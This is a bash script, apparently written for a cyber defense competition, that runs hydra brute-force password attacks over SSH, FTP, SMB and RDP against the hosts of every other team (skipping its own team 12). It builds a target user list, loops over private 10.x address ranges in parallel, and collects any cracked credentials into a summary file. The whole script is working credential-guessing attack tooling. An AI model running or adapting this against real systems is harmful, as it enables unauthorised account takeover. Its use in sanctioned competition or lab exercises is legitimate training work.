#!/usr/bin/env bash
# default_pw_check.sh — Check other teams for default passwords using hydra
# Usage: ./default_pw_check.sh <password_file>
#        ./default_pw_check.sh <single_password>
# Checks teams 1-13, skipping team 12 (us)
# Requires: hydra (pre-installed on Kali)

set -uo pipefail

if [ $# -lt 1 ]; then
    cat <<'EOF'
Usage:
  ./default_pw_check.sh passwords.txt       # file with one password per line
  ./default_pw_check.sh 'SinglePassword'    # single password to try

Each user may have a different default password.
You can also use a colon-delimited file (user:password per line):
  ./default_pw_check.sh -C creds.txt
EOF
    exit 1
fi

OUR_TEAM=12
THREADS=8
TIMEOUT=10

RED='\033[1;31m'
GRN='\033[1;32m'
YLW='\033[1;33m'
BLU='\033[1;34m'
CYN='\033[1;36m'
RST='\033[0m'

if ! command -v hydra &>/dev/null; then
    echo "hydra not found. Install with: sudo apt install hydra"
    exit 1
fi

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
RESULTS_DIR="/tmp/tcdc_pw_check_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$RESULTS_DIR"

# Build user list
USERFILE="$RESULTS_DIR/users.txt"
cat > "$USERFILE" <<'USERS'
washington
kennedy
teddy
lincoln
ross
streep
franklin
parks
armstrong
hamilton
mlk
tubman
manziel
deniro
bush
USERS

# Handle credential modes
COMBO_MODE=false
if [ "$1" = "-C" ] && [ -n "${2:-}" ]; then
    COMBO_FILE="$2"
    COMBO_MODE=true
    echo -e "${YLW}Using combo file: $COMBO_FILE (user:pass per line)${RST}"
elif [ -f "$1" ]; then
    PASSFILE="$1"
    echo -e "${YLW}Using password file: $PASSFILE${RST}"
else
    PASSFILE="$RESULTS_DIR/passwords.txt"
    echo "$1" > "$PASSFILE"
    echo -e "${YLW}Using single password${RST}"
fi

SUMMARY="$RESULTS_DIR/summary.txt"
echo "TCDC Default Password Check - $(date)" > "$SUMMARY"
echo "==========================================" >> "$SUMMARY"

echo -e "${BLU}========================================${RST}"
echo -e "${BLU}  TCDC Default Password Checker (hydra)${RST}"
echo -e "${BLU}  $(date)${RST}"
echo -e "${BLU}  Skipping Team $OUR_TEAM (us)${RST}"
echo -e "${BLU}  Threads per host: $THREADS${RST}"
echo -e "${BLU}========================================${RST}"
echo ""

run_hydra() {
    local proto="$1"
    local host="$2"
    local name="$3"
    local team="$4"
    local outfile="$RESULTS_DIR/team${team}_${name}_${proto}.txt"

    if $COMBO_MODE; then
        hydra -C "$COMBO_FILE" \
            -t "$THREADS" -w "$TIMEOUT" -f \
            -o "$outfile" \
            "$host" "$proto" 2>/dev/null
    else
        hydra -L "$USERFILE" -P "$PASSFILE" \
            -t "$THREADS" -w "$TIMEOUT" -f \
            -o "$outfile" \
            "$host" "$proto" 2>/dev/null
    fi

    if [ -s "$outfile" ] && grep -q '\[' "$outfile"; then
        while IFS= read -r line; do
            echo -e "  ${RED}FOUND${RST} Team${team}/${name} -> ${YLW}${line}${RST}"
            echo "  Team${team}/${name} -> ${line}" >> "$SUMMARY"
        done < <(grep '\[' "$outfile")
    fi
}

for TEAM in $(seq 1 13); do
    [ "$TEAM" -eq "$OUR_TEAM" ] && continue

    NET=$((100 + TEAM))
    echo -e "${CYN}=== Team $TEAM (10.${NET}.x.x) ===${RST}"
    echo "" >> "$SUMMARY"
    echo "=== Team $TEAM ===" >> "$SUMMARY"

    # SSH targets (Linux boxes)
    run_hydra ssh "10.${NET}.10.53"  ns1              "$TEAM" &
    run_hydra ssh "10.${NET}.10.21"  ftp-archive      "$TEAM" &
    run_hydra ssh "10.${NET}.10.80"  artifactorium    "$TEAM" &
    run_hydra ssh "10.${NET}.10.22"  ssh-workstation  "$TEAM" &
    run_hydra ssh "10.150.0.${TEAM}" ipcam            "$TEAM" &

    # FTP on ftp-archive
    run_hydra ftp "10.${NET}.10.21"  ftp-archive-ftp  "$TEAM" &

    # SMB on Windows boxes
    run_hydra smb "10.${NET}.20.88"  ad               "$TEAM" &
    run_hydra smb "10.${NET}.30.49"  mqtt             "$TEAM" &

    # RDP on Windows boxes
    run_hydra rdp "10.${NET}.20.88"  ad-rdp           "$TEAM" &
    run_hydra rdp "10.${NET}.30.49"  mqtt-rdp         "$TEAM" &

    wait
    echo ""
done

echo -e "${BLU}========================================${RST}"
FOUND=$(grep -c 'FOUND\|Team' "$SUMMARY" 2>/dev/null || echo 0)
if [ "$FOUND" -gt 0 ]; then
    echo -e "${RED}  Credentials found — see summary below${RST}"
    echo ""
    cat "$SUMMARY"
else
    echo -e "${GRN}  No default passwords found${RST}"
fi
echo ""
echo -e "  Full results: ${YLW}$RESULTS_DIR/${RST}"
echo -e "${BLU}========================================${RST}"

